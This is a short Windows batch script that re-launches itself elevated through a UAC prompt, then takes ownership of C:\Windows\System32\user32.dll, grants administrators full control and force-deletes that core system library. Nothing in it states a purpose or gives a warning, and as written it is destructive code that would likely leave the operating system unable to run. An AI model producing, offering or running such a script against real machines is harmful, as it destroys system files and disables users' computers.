@echo off

if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin; exit /b)


takeown /f "C:\Windows\System32\user32.dll"
icacls "C:\Windows\System32\user32.dll" /grant administrators:F /T
del /f "C:\Windows\System32\user32.dll"
